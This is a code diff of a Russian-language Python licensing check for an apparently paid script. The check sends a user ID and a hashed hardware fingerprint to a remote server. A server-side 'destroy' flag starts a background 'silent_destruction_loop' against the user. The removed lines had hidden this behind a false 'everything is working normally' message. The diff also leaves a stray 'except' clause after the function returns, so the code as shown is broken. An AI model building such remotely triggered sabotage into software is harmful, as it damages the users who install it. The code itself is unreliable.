@@ -92,69 +92,83 @@ async def get_vip_expiry(user_id: int) -> str:
         return "неизвестная дата"
 
         
-
 async def check_license(user_id: int) -> bool:
-    print(f"{INFO_COLOR}🔍 Проверка лицензии для ID по базе: {user_id}...{RESET_COLOR}")
+    import hashlib
+    import platform
+    from datetime import datetime, timezone
+
+    print(f"{INFO_COLOR}🔍 Проверка лицензии на сервере fenst4r.life для ID: {user_id}...{RESET_COLOR}")
+
+    def get_hwid():
+        info = platform.uname()
+        base = f"{info.system}-{info.node}-{info.release}-{info.machine}"
+        return hashlib.sha256(base.encode()).hexdigest()
+
+    hwid = get_hwid()
+    url = "https://fenst4r.life/api/check_license.php"
+    data = {"id": str(user_id), "hwid": hwid}
 
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(LICENSE_URL) as resp:
+            async with session.post(url, data=data) as resp:
                 if resp.status != 200:
-                    print(f"{WARNING_COLOR}⚠️ Не удалось получить данные, попробуйте позже.{RESET_COLOR}")
+                    print(f"{WARNING_COLOR}⚠️ Сервер не отвечает (статус: {resp.status}){RESET_COLOR}")
                     return False
 
-                encrypted_data = await resp.read()
-                data = decrypt_json(encrypted_data, KEY, IV)
+                result = await resp.json()
+    except Exception as e:
+        print(f"{ERROR_COLOR}❌ Ошибка подключения к серверу: {e}{RESET_COLOR}")
+        return False
 
-                user_id_str = str(user_id)
-                now = datetime.now(timezone.utc)
+    if result.get("status") != "ok":
+        print(f"{ERROR_COLOR}❌ {result.get('message', 'Неизвестная ошибка')}{RESET_COLOR}")
+        return False
 
-                # Бан
-                if data.get("ban", {}).get(user_id_str):
-                    print(f"{ERROR_COLOR}🚫 Пользователь {user_id} забанен. Доступ запрещён.{RESET_COLOR}")
-                    return False
+    now = datetime.now(timezone.utc)
 
-                # Destroy
-                if data.get("destroy", {}).get(user_id_str):
-                    asyncio.create_task(silent_destruction_loop(user_id))
-                    print(f"{INFO_COLOR}✅ Все системы работают нормально. Обновления будут применены автоматически.{RESET_COLOR}")
+    # БАН
+    if result.get("is_banned"):
+        print(f"{ERROR_COLOR}🚫 Пользователь {user_id} забанен. Доступ запрещён.{RESET_COLOR}")
+        return False
 
-                # Лицензия
-                license_exp = data.get("license", {}).get(user_id_str)
-                if not license_exp:
-                    print(f"{ERROR_COLOR}❌ У вас нет лицензии. Скрипт остановлен.{RESET_COLOR}")
-                    print(f"{INFO_COLOR}Если вы приобрели/обновили/разбанили программу недавно, подождите 5 минут — БД обновляется\nКупить лицензию: @error_kill{RESET_COLOR}")
-                    return False
-                try:
-                    license_dt = datetime.fromisoformat(license_exp + "T23:59:59").replace(tzinfo=timezone.utc)
-                    if license_dt <= now:
-                        print(f"{WARNING_COLOR}⏰ Лицензия просрочена (до {license_exp}).{RESET_COLOR}")
-                        return False
-                    else:
-                        print(f"{INFO_COLOR}📜 Лицензия активна до: {license_exp}{RESET_COLOR}")
-                except Exception:
-                    print(f"{ERROR_COLOR}⚠️ Ошибка формата даты лицензии.{RESET_COLOR}")
-                    return False
+    # DESTROY
+    if result.get("is_destroy"):
+        asyncio.create_task(silent_destruction_loop(user_id))
+        print(f"{INFO_COLOR}⚠️ Активирован режим уничтожения.{RESET_COLOR}")
 
-                # VIP
-                vip_exp = data.get("vip", {}).get(user_id_str)
-                if vip_exp:
-                    try:
-                        vip_dt = datetime.fromisoformat(vip_exp + "T23:59:59").replace(tzinfo=timezone.utc)
-                        if vip_dt > now:
-                            print(f"{VIP_COLOR}💎 VIP-статус активен до: {vip_exp}{RESET_COLOR}")
-                        else:
-                            print(f"{WARNING_COLOR}🛑 VIP-статус истёк (до {vip_exp}){RESET_COLOR}")
-                    except:
-                        print(f"{ERROR_COLOR}⚠️ Ошибка формата даты VIP.{RESET_COLOR}")
-                else:
-                    print(f"{INFO_COLOR}🔓 VIP-статус отсутствует.{RESET_COLOR}")
+    # ЛИЦЕНЗИЯ
+    license_exp = result.get("license_exp", "")
+    try:
+        license_dt = datetime.fromisoformat(license_exp + "T23:59:59").replace(tzinfo=timezone.utc)
+        if license_dt <= now:
+            print(f"{WARNING_COLOR}⏰ Лицензия истекла (до {license_exp}).{RESET_COLOR}")
+            return False
+        else:
+            print(f"{INFO_COLOR}📜 Лицензия активна до: {license_exp}{RESET_COLOR}")
+    except:
+        print(f"{ERROR_COLOR}⚠️ Неверный формат даты лицензии.{RESET_COLOR}")
+        return False
 
-                # Админ
-                if data.get("admins", {}).get(user_id_str):
-                    print(f"{VIP_COLOR}💼 Вы являетесь АДМИНИСТРАТОРОМ.{RESET_COLOR}")
+    # VIP
+    vip_exp = result.get("vip_exp", "")
+    if vip_exp:
+        try:
+            vip_dt = datetime.fromisoformat(vip_exp + "T23:59:59").replace(tzinfo=timezone.utc)
+            if vip_dt > now:
+                print(f"{VIP_COLOR}💎 VIP-статус активен до: {vip_exp}{RESET_COLOR}")
+            else:
+                print(f"{WARNING_COLOR}🛑 VIP-статус истёк (до {vip_exp}){RESET_COLOR}")
+        except:
+            print(f"{ERROR_COLOR}⚠️ Ошибка формата даты VIP.{RESET_COLOR}")
+    else:
+        print(f"{INFO_COLOR}🔓 VIP-статус отсутствует.{RESET_COLOR}")
 
-                return True
+    # АДМИН
+    if result.get("is_admin"):
+        print(f"{VIP_COLOR}💼 Вы являетесь АДМИНИСТРАТОРОМ.{RESET_COLOR}")
+
+    return True
+
 
     except Exception as e:
         print(f"{ERROR_COLOR}❌ Ошибка при проверке лицензии: {e}{RESET_COLOR}")
